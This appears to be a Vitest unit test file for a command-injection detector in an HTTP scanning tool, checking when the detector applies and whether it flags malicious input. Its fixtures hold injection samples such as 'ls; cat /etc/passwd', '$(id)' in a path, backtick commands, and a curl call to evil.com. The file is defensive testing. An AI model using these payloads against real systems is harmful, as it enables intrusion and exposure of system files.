import { describe, test, expect } from "vitest";
import { CommandInjectionDetector } from "../../../../src/detectors/http/command/command.detector";
import { COMMAND_PATTERNS } from "../../../../src/detectors/http/command/command.patterns";
import { ScanContextImpl } from "../../../../src/core/scan.context";

describe("CommandInjectionDetector", () => {
  test("patterns file exports an array of regex", () => {
    expect(Array.isArray(COMMAND_PATTERNS)).toBe(true);
    expect(COMMAND_PATTERNS.length).toBeGreaterThan(0);
    expect(COMMAND_PATTERNS.every((p) => p instanceof RegExp)).toBe(true);
  });

  test("applies() returns false when no http events exist", () => {
    const ctx = new ScanContextImpl();
    ctx.addEvent({
      id: "e1",
      source: "dns",
      timestamp: Date.now(),
      metadata: {},
    });

    const det = new CommandInjectionDetector();
    expect(det.applies(ctx)).toBe(false);
  });

  test("applies() returns false when events array is empty", () => {
    const ctx = new ScanContextImpl();
    const det = new CommandInjectionDetector();
    expect(det.applies(ctx)).toBe(false);
  });

  test("applies() returns true when http event exists", () => {
    const ctx = new ScanContextImpl();
    ctx.addEvent({
      id: "e1",
      source: "http",
      timestamp: Date.now(),
      metadata: {},
    });

    const det = new CommandInjectionDetector();
    expect(det.applies(ctx)).toBe(true);
  });

  test("detects command injection payloads", () => {
    const ctx = new ScanContextImpl();

    ctx.addEvent({
      id: "e1",
      source: "http",
      timestamp: Date.now(),
      payload: "ls; cat /etc/passwd",
      metadata: {},
    });

    const det = new CommandInjectionDetector();
    const findings = det.execute(ctx);

    expect(findings.length).toBeGreaterThan(0);
  });

  test("detects command injection in metadata", () => {
    const ctx = new ScanContextImpl();

    ctx.addEvent({
      id: "e1",
      source: "http",
      timestamp: Date.now(),
      metadata: {
        query: { cmd: "whoami" },
        path: "/run?exec=$(id)",
        headers: { referer: "curl http://evil.com" },
        body: { data: "`ls -la`" },
      },
    });

    const det = new CommandInjectionDetector();
    const findings = det.execute(ctx);

    expect(findings.length).toBeGreaterThan(0);
  });

  test("returns empty array when no command injection patterns found", () => {
    const ctx = new ScanContextImpl();

    ctx.addEvent({
      id: "e1",
      source: "http",
      timestamp: Date.now(),
      payload: "safe content",
      metadata: {},
    });

    const det = new CommandInjectionDetector();
    const findings = det.execute(ctx);

    expect(findings).toHaveLength(0);
  });

  test("returns empty array when metadata headers/query/body missing", () => {
    const ctx = new ScanContextImpl();

    ctx.addEvent({
      id: "e1",
      source: "http",
      timestamp: Date.now(),
      metadata: {}, // no headers/query/body
    });

    const det = new CommandInjectionDetector();
    const findings = det.execute(ctx);

    expect(findings).toHaveLength(0);
  });
});
